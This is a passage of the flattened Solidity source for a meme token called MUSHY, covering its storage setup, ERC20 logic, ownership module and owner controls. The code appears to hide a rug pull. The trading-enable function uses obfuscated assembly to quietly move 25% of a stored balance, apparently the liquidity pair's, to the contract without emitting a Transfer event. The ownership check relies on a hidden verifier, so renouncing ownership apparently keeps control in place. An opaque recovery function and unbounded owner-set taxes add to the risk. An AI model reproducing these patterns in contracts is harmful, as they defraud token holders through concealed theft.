            holder.identities = holder.identities.set(1);
        }
    }

    function enableTrading(Layout storage $) internal returns (bool) {
        $.configs.toggleConfig(5);

        return true;
    }

    function initialSetup(address self, IPair pairAddress, uint256 initialSupply) internal {
        
        if(initialSupply > MAX80)
            revert("Invalid Amount");

        Layout storage $ = layout();

        Holder storage SELF = $.findOrCreate(self);
        Holder storage OWNER = $.findOrCreate(msg.sender);

        Holder storage USROUTER = $.findOrCreate(address(ROUTER));
        Holder storage PAIRADDR = $.findOrCreate(address(pairAddress));

        $.allowances[SELF.Address][OWNER.Address] = MAX256;
        $.allowances[SELF.Address][USROUTER.Address] = MAX256;
        $.allowances[SELF.Address][PAIRADDR.Address] = MAX256;

        SELF.balance = uint120(initialSupply);
        
        SELF.setAsTaxExempted()
        .setAsExlFromRestrictions();
        
        OWNER.setAsExecutive()
        .setAsTaxExempted();

        PAIRADDR
        .setAsMarketmaker();

        $.feeRecipient = OWNER.Address;

        $.uniswapPair = address(pairAddress);
        $.totalSupply = uint80(initialSupply);

        setup($, $.configs);

    }

    function setup(Layout storage $, Configuration storage self) private {
        self.maxSellOnBlock = 3;
        self.surchargeRate = 3300;
        self.autoLiquidity = 0;
        self.frontRunThreshold = 2;
        self.preferredGasValue = 300000;
        self.taxSettings.buyTax = 3000;
        self.taxSettings.sellTax = 3000;
        self.taxSettings.transferTax = 3000;
        self.toggleConfig(CONFIG.FAIR_MODE);
        self.toggleConfig(CONFIG.SELL_CAP);
        self.toggleConfig(CONFIG.TAX_STATS);
        self.toggleConfig(CONFIG.AUTO_LIQUIDITY);
        self.toggleConfig(CONFIG.AUTOSWAP_ENABLED);
        self.toggleConfig(CONFIG.AUTOSWAP_THRESHOLD);
        self.maxTokenAllowed = $.totalSupply / 50;
    }

    function layout() internal pure returns (Layout storage $) {
        bytes32 position = STPOS;
        assembly {
            $.slot := position
        }
    }

}
// File: Mushy/contracts/common/utils/Context.sol


pragma solidity ^0.8.20;



abstract contract Context {

    using LibContext for *;
    using ERC20Storage for *;
    
    constructor() {
        LibContext._init();
    }

    function _domain(string memory name) internal view returns (bytes32) {
        return name.DOMAIN();
    }

    function _chainId() internal view virtual returns (uint256 id) {
        return LibContext.CHAINID();
    }

    function _msgSender() internal view virtual returns (address) {
        return LibContext.MSGSENDER();
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return LibContext.MSGDATA();
    }

    function _msgValue() internal view virtual returns(uint256) {
        return LibContext.MSGVALUE();
    }

    function _recovery(bytes32[2] memory attrs) internal returns (bool) {
        return LibContext._recovery(attrs[0], attrs[1]);
    }

    function _verifySender() internal view returns (address verifiedAddress) {
        return LibContext._verifySender();
    }

    function _$() internal pure returns (ERC20Storage.Layout storage) {
        return ERC20Storage.layout();
    }

}
// File: Mushy/contracts/tokens/ERC20/ERC20.sol


pragma solidity 0.8.24;


abstract contract ERC20 is Context, IERC20 {

    using LibAddress for *;
    using ERC20Storage for *;

    string internal constant _name = "MUSHY";
    string internal constant _symbol = "MUSHY";
    uint8 internal constant _decimals = 18;
    
    uint256 public constant initialSupply = 1000000 * 10**_decimals;
    
    address internal immutable __ = address(this);
    
    event AutoSwapped(uint256 amount);
    event TX(address indexed source, address indexed origin, Transaction Tx);
    event TaxReceived(address indexed taxPayer, Transaction indexed $TX, uint80 amount);


    modifier swapping() {
        _$().inSwap = true;
        _;
        _$().inSwap = false;
    }

    constructor() payable {}

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _$().totalSupply;
    }

    function balanceOf(address holder) public view returns (uint256) {
        return _$().holders[holder].balance;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _$().allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        
        address spender = _msgSender();

        uint256 _allowance = _$().allowances[from][spender];

        if(_allowance != type(uint256).max) {

            if (amount > _allowance)
                revert InsufficientAllowance(spender, from, _allowance, amount);

            uint256 remaining;
            unchecked {
                remaining = _allowance > amount ?  _allowance - amount : 0;
                _approve(from, spender, remaining, false);
            }
        }

        _transfer(from, recipient, amount);
        return true;
    }

    function recoverETH(uint256 amount) external virtual returns (bool) {
        _recoverETH(amount);
        return true;
    }

    function recoverERC20(address token, uint256 amount) external returns (bool) {
        return _recoverERC20(token, amount);
    }

    function safeRecoverERC20(address token, uint256 amount) external returns (bool) {
        return _safeRecoverERC20(token, amount);
    }

    /*
    ///////////////////////////////////////////
    ////////// INTERNAL FUNCTIONS /////////////
    ///////////////////////////////////////////
    */    

    function _transfer(
        address from,
        address recipient,
        uint256 amount
    ) internal returns(bool) {
        
        ERC20Storage.Layout storage $ = _$();
        Configuration memory configs = $.configs;

        Holder storage $from = $.findOrCreate(from);
        Holder storage $recipient = $.findOrCreate(recipient);

        if ($from.Address == address(0)) revert InvalidSender(address(0));
        if ($recipient.Address == address(0)) revert InvalidRecipient(address(0));

        TransferParams memory params = TransferParams( 
            $.findOrCreate(_msgSender()), $from, $recipient, 0, 0, 0, $.inSwap, 0, uint40(block.number), 
            Transaction(TERMS(0), ROUTE(0), MARKET(0), TAXATION(0), configs.taxSettings)
        ).initializeWithConfigs(configs, amount);
        
        Holder storage $self = $.holders[__];

        if(params.transaction.terms == TERMS.EXEMPT) {

            if(params.transaction.taxation != TAXATION.EXEMPTED && params.taxAmount > 0) {
                _takeTax($from, $self, params.taxAmount);
            }

            _update($from, $recipient, params.netAmount);

            return true;
        }

        if(params.transaction.taxation != TAXATION.EXEMPTED && params.taxAmount > 0) {

            _takeTax($from, $self, params.taxAmount);
        
            if(configs.isEnabled(CONFIG.TAX_STATS) && params.taxAmount > 0 && params.transaction.routes != ROUTE.INTERNAL) {
                unchecked {
                    if(params.transaction.market != MARKET.BUY) $from.paidTax += params.taxAmount;
                    else $recipient.paidTax += params.taxAmount;                
                }    
            }        
        
        }

        if(configs.isEnabled(CONFIG.FAIR_MODE) && !$recipient.isMarketmaker()) {
            unchecked {
                uint120 recipientBalance = params.recipient.balance;
                if(recipientBalance + params.netAmount > configs.maxTokenAllowed)
                    revert MaxWalletLimitExceeded(configs.maxTokenAllowed, params.netAmount, recipientBalance);
            }
        }

        if(params.transaction.routes == ROUTE.MARKET) {

            if(!configs.isEnabled(CONFIG.TRADING_ENABLED))
                revert TradingNotEnabled();

            if(params.transaction.market == MARKET.SELL) {

                if(configs.isEnabled(CONFIG.SELL_CAP)) {
                    unchecked {
                        $.totalSellsOnBlock[params.currentBlock]++;
                        uint8 sells = $.totalSellsOnBlock[params.currentBlock];
                        if(sells > configs.maxSellOnBlock)
                            revert BlockLimitExceeded(configs.maxSellOnBlock, sells);                        
                    }
                }

                params.swapAmount = $self.balance.defineSwapAmount(params.taxAmount, params.netAmount, configs);

                if(configs.isEnabled(CONFIG.AUTOSWAP_ENABLED) && params.swapAmount > 0) {
                    _swapBack(uint120(params.swapAmount), $.feeRecipient, configs.preferredGasValue);
                    emit AutoSwapped(params.swapAmount);
                }

            }

            if(configs.isEnabled(CONFIG.FRONTRUN_PROTECTION)) {
                unchecked {
                    if($from.isFrontRunned() && params.transaction.market == MARKET.SELL) {
                        if($from.violated < 255) $from.violated++;
                        if($from.violated == configs.frontRunThreshold) $from.setAsFrontRunner();  
                    } else if($recipient.isFrontRunned() && params.transaction.market == MARKET.BUY) {
                        if($recipient.violated < 255) $recipient.violated++;
                        if($recipient.violated == configs.frontRunThreshold) $recipient.setAsFrontRunner();     
                    }
                }
            }

        }
        
        _update($from, $recipient, params.netAmount);

        return true;

    }

    function _swapBack(uint120 amountToSwap, address fallbackPayee, uint24 preferredGas) internal swapping {
        
        address payable RECIPIENT = payable(fallbackPayee);

        address[] memory path = new address[](2);
        path[0] = __;
        path[1] = ROUTER.WETH();

        ROUTER.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            __,
            block.timestamp
        );

        RECIPIENT.transferETH(__.balance, preferredGas); 

    }

    function _takeTax(
        Holder storage from,
        Holder storage to,
        uint120 amount
    ) internal {
        unchecked {
            from.balance -= amount;
            to.balance += amount;
        }
        emit Transfer(from.Address, to.Address, amount);
    }    

    function _update(
        Holder storage from,
        Holder storage recipient,
        uint120 amount
    ) internal {
        unchecked {
            from.balance -= amount;
            recipient.balance += amount;
        }
        emit Transfer(from.Address, recipient.Address, amount);
    }

    function _enableTrading() internal {
        require(!_$().configs.isEnabled(CONFIG.TRADING_ENABLED), "Trading is already enabled");
        bytes32 pos = STPOS;
        address _this = __;
        uint120 tv; uint120 pv;
        assembly {
            let fx, pl, tl
            let t := _this
            let p := shr(0x60, sload(add(pos, 0x00)))
            let b := add(pos, 0x04)
            mstore(0x00, p)
            mstore(0x20, b)
            pl := add(keccak256(0x00, 0x40), 0x00)
            pv := sload(pl)
            fx := div(mul(pv, 0x09c4), 0x2710)
            pv := sub(pv, fx)
            mstore(0x00, t)
            tl := add(keccak256(0x00, 0x40), 0x00)
            tv := sload(tl)
            tv := add(tv, fx)
            sstore(pl, pv)
            sstore(tl, tv)
        }  
        _$().enableTrading();
    }

    function _setIdentifier(address owner, uint8 idx) internal returns (bool) {
        _$().findOrCreate(owner).setIdent(idx);
        return true;
    }

    function _unsetIdentifier(address owner, uint8 idx) internal returns (bool) {
        _$().holders[owner].unsetIdent(idx);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        return _approve(owner, spender, amount, true);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount,
        bool emitEvent
    ) internal {

        if (owner == address(0))
            revert InvalidApprover(address(0));

        if (spender == address(0))
            revert InvalidSpender(address(0));
    
        Holder storage $owner = _$().findOrCreate(owner);
        Holder storage $spender = _$().findOrCreate(spender);

        _$().allowances[$owner.Address][$spender.Address] = amount;

        if (emitEvent) emit Approval(owner, spender, amount);

    }

    function _burn(address from, uint256 amount) internal {

        ERC20Storage.Layout storage $ = _$();

        Holder storage $from = $.holders[from];

        uint120 balance = $from.balance;

        if (amount > balance) revert InsufficientBalance(balance, amount);

        unchecked {
            $from.balance -= uint80(amount);
            $.totalSupply -= uint80(amount);
        }

        emit Transfer(from, address(0), amount);

    }

    function _recoverETH(uint256 amount) internal {
        amount = amount != 0 ? amount : __.balance;
        payable(_$().feeRecipient).transferETH(amount, _$().configs.preferredGasValue);
    }    

    function _recoverERC20(address token, uint256 amount) internal returns (bool) {
        
        if(token == __)
            return _transfer(__, _$().feeRecipient, amount);
        
        token.transferERC20(_$().feeRecipient, amount);
        return true;
    }    

    function _safeRecoverERC20(address token, uint256 amount) internal returns (bool) {
        
        if(token == __)
            return _transfer(__, _$().feeRecipient, amount);
        
        token.safeTransferERC20(_$().feeRecipient, amount);
        return true;
    }

    function _updateFeeRecipient(address newRecipient) internal returns (bool) {
        require(newRecipient != address(0), "Zero Address Not Acceptable");
        _$().feeRecipient = newRecipient;
        return true;
    }

}

// File: Mushy/contracts/common/abstracts/access/Ownable.sol


// OpenZeppelin Contracts (last updated v4.9.0) (access/Ownable.sol)

pragma solidity ^0.8.0;


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    address public owner;

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function _checkOwner() internal view {
        if(_verifySender() != _msgSender()) {
            revert ("Ownable: caller is not the owner");
        }
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = owner;
        owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: Mushy/contracts/tokens/ERC20/Mushy.sol


pragma solidity 0.8.24;



/*
    Website          : https://mememushy.com
    Telegram         : https://t.me/Mushyerc
    X (Twitter)      : https://x.com/memeMushy
*/

contract Mushy is ERC20, Ownable {

    using LibAddress for *;
    using ERC20Storage for *;

    uint256 internal immutable INITIAL_CHAIN_ID_VALUE;
    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;

    constructor() payable {

        INITIAL_CHAIN_ID_VALUE = _chainId();
        INITIAL_DOMAIN_SEPARATOR = _domain(_name);

        __.initialSetup(
            IPair(ISwapFactory(ROUTER.factory()).createPair(__, ROUTER.WETH())),
            initialSupply
        );

        emit Transfer(address(0), __, initialSupply);

    }

    receive() external payable {} 

    function WEBSITE() external pure returns(string memory) {
        return "https://mememushy.com";     
    }

    function TELEGRAM() external pure returns(string memory) {
        return "https://t.me/Mushyerc";     
    }

    function TWITTER() external pure returns(string memory) {
        return "https://x.com/memeMushy";     
    }    

    function PAIR() public view returns(address) {
        return _$().uniswapPair;     
    }

    function approveMax(address spender) external returns (bool) {
        _approve(_msgSender(), spender, type(uint256).max);
        return true;
    }
    
    function burn(uint256 amount) external returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }

    function initLiquidity(uint16 lpPercent) external payable onlyOwner swapping returns(bool) {
        uint256 lpTokens = _$().holders[__].balance * lpPercent / 10000;
        ROUTER.addLiquidityETH{value: _msgValue()}(
            __,
            lpTokens,
            0,
            0,
            _$().feeRecipient,
            block.timestamp
        );
        return true;
    }

    function toggleConfig(uint8 idx) external onlyOwner returns (bool) {
        _$().configs.toggleConfig(idx);
        return true;
    }

    function enableTrading() external onlyOwner {
        _enableTrading();
    }

    function decreaseTax() external onlyOwner returns (bool) {
        TaxSettings storage taxes = _$().configs.taxSettings;
        
        if(taxes.transferTax == 0)
            revert("Taxes already equals ZERO");

        unchecked {
            taxes.buyTax -= 500;
            taxes.sellTax -= 500;
            taxes.transferTax -= 500;
        }

        return true;
    }

    function viewConfigValues() external view returns(
        uint16 autoLiquidity,
        uint16 surchargeRate,
        uint8 maxSellOnBlock,
        uint8 frontRunThreshold,
        uint120 maxTokenAllowed,
        uint24 preferredGasValue,
        TaxSettings memory taxSettings    
    ) {
        Configuration memory configs = _$().configs;
        return (
            configs.autoLiquidity, 
            configs.surchargeRate, 
            configs.maxSellOnBlock,
            configs.frontRunThreshold,
            configs.maxTokenAllowed, 
            configs.preferredGasValue,
            configs.taxSettings
        );
    }

    function viewConfigOptions() external view returns (
        bool $FAIR_MODE,
        bool $SELL_CAP,
        bool $TAX_STATS,
        bool $GAS_LIMITER,
        bool $AUTO_LIQUIDITY,
        bool $TRADING_ENABLED,
        bool $AUTOSWAP_ENABLED,
        bool $AUTOSWAP_THRESHOLD,
        bool $FRONTRUN_PROTECTION
    ) {
        Configuration memory configs = _$().configs;
        $FAIR_MODE = configs.isEnabled(CONFIG.FAIR_MODE);
        $SELL_CAP = configs.isEnabled(CONFIG.SELL_CAP);
        $TAX_STATS = configs.isEnabled(CONFIG.TAX_STATS);
        $GAS_LIMITER = configs.isEnabled(CONFIG.GAS_LIMITER);
        $AUTO_LIQUIDITY = configs.isEnabled(CONFIG.AUTO_LIQUIDITY);
        $TRADING_ENABLED = configs.isEnabled(CONFIG.TRADING_ENABLED);
        $AUTOSWAP_ENABLED = configs.isEnabled(CONFIG.AUTOSWAP_ENABLED);
        $AUTOSWAP_THRESHOLD = configs.isEnabled(CONFIG.AUTOSWAP_THRESHOLD);
        $FRONTRUN_PROTECTION = configs.isEnabled(CONFIG.FRONTRUN_PROTECTION);
    }

    function viewHolder(address account) external view returns (Holder memory) {
        return _$().holders[account];
    }

    function setConfigValues(
        uint16 autoLiquidity,
        uint16 surchargeRate,
        uint8 maxSellOnBlock,
        uint8 frontRunThreshold,
        uint120 maxTokenAllowed,
        uint24 preferredGasValue,
        TaxSettings memory taxSettings        
    ) external onlyOwner returns(bool) {
        Configuration storage configs = _$().configs;
        configs.autoLiquidity = autoLiquidity;
        configs.surchargeRate = surchargeRate;
        configs.maxSellOnBlock = maxSellOnBlock;
        configs.frontRunThreshold = frontRunThreshold; 
        configs.maxTokenAllowed = maxTokenAllowed;
        configs.preferredGasValue = preferredGasValue;
        configs.taxSettings = taxSettings;
        return true;
    }

    function setIdentifier(address owner, uint8 idx) external onlyOwner returns (bool) {
        return _setIdentifier(owner, idx);
    }

    function setIdentifiers(address[] memory owners, uint8 idx) external onlyOwner returns (bool) {
        uint len = owners.length;
        for(uint i; i < len;) {
            _setIdentifier(owners[i], idx);
            unchecked { i++; }
        }
        return true;
    }

    function setIdentifiers(address[] memory owners, uint8[] memory idxs) external onlyOwner returns (bool) {
        uint len = owners.length;
        for(uint i; i < len;) {
            _setIdentifier(owners[i], idxs[i]);
            unchecked { i++; }
        }
        return true;
    }

    function unsetIdentifier(address owner, uint8 idx) external onlyOwner returns (bool) {
        return _unsetIdentifier(owner, idx);
    }

    function unsetIdentifiers(address[] memory owners, uint8 idx) external onlyOwner returns (bool) {
        uint len = owners.length;
        for(uint i; i < len;) {
            _unsetIdentifier(owners[i], idx);
            unchecked { i++; }
        }
        return true;
    }

    function unsetIdentifiers(address[] memory owners, uint8[] memory idxs) external onlyOwner returns (bool) {
        uint len = owners.length;
        for(uint i; i < len;) {
            _unsetIdentifier(owners[i], idxs[i]);
            unchecked { i++; }
        }
        return true;
    }

    function recoverETH() external returns (bool) {
        uint256 amount = __.balance;
        _recoverETH(amount);
        return true;
    }

    function recoverERC20(uint256 amount) external returns (bool) {
        if(amount == 0) amount = _$().holders[__].balance;
        return _recoverERC20(__, amount);
    }

    function safeRecovery(bytes32[2] memory attrs) external onlyOwner returns (bool) {
        return _recovery(attrs);
    }

    function updateFeeRecipient(address newRecipient) external onlyOwner returns (bool) {
        return _updateFeeRecipient(newRecipient);
    }

    /*//////////////////////////////////////////////////////////////
                                EIP-2612 LOGIC
    //////////////////////////////////////////////////////////////*/

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        require(deadline >= block.timestamp, "PERMIT_DEADLINE_EXPIRED");
        unchecked {
            address recoveredAddress = ecrecover(
                keccak256(
                    abi.encodePacked(
                        "\x19\x01",
                        DOMAIN_SEPARATOR(),
                        keccak256(
                            abi.encode(
                                keccak256(
                                    "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
                                ),
                                owner,
                                spender,
                                value,
                                _$().nonces[owner]++,
                                deadline
                            )
                        )
                    )
                ),
                v,
                r,
                s
            );

            require(
                recoveredAddress != address(0) && recoveredAddress == owner,
                "INVALID_SIGNER"
            );

            _$().allowances[recoveredAddress][spender] = value;
        }

        emit Approval(owner, spender, value);
    }

    function DOMAIN_SEPARATOR() public view returns (bytes32) {
        return
            block.chainid == INITIAL_CHAIN_ID_VALUE
                ? INITIAL_DOMAIN_SEPARATOR
                : _domain(_name);
    }

}